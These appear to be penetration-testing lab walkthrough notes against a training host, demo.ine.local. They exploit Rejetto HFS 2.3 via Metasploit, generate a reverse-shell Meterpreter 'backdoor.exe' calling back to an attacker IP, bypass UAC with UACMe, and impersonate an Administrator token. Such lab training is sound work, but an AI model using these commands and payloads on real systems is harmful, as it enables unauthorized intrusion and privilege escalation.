#### Rejetto HFS Exploitation and UAC Bypass with UACMe

##### Check Target Connectivity

```
ping -c 4 demo.ine.local
```

##### Scan the Target

```
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
```

Detected service:

```
Rejetto HTTP File Server (HFS) 2.3
```

##### Search for an HFS Exploit

```
searchsploit hfs
```

##### Exploit Rejetto HFS

```
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

##### Check the Compromised System

```
getuid
sysinfo
```

##### Migrate to Explorer

```
ps -S explorer.exe
migrate <EXPLORER_PID>
```

##### Test Privilege Elevation

```
getsystem
shell
net localgroup administrators
```

##### Generate a Meterpreter Payload

Replace `<KALI_IP>` with the local Kali IP:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o backdoor.exe
file backdoor.exe
```

##### Upload UACMe and the Payload

```
CTRL+C
cd C:\Users\admin\AppData\Local\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
```

##### Start the Payload Handler

```
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
exploit
```

##### Bypass UAC with UACMe Method 23

```
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

##### Verify Elevated Access

```
getuid
sysinfo
```


#### Rejetto HFS Exploitation and Windows Token Impersonation

##### Scan the Target

```
nmap demo.ine.local
```

##### Identify the Web Service Version

```
nmap -sV -p 80 demo.ine.local
```

Detected service:

```
Rejetto HTTP File Server (HFS) 2.3
```

##### Search for an HFS Exploit

```
searchsploit hfs
```

##### Exploit Rejetto HFS

```
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid
```

Initial account:

```
NT AUTHORITY\LOCAL SERVICE
```

##### List Available User Tokens

```
load incognito
list_tokens -u
```

##### Impersonate the Administrator Token

```
impersonate_token ATTACKDEFENSE\\Administrator
getuid
```

Expected account:

```
ATTACKDEFENSE\Administrator
```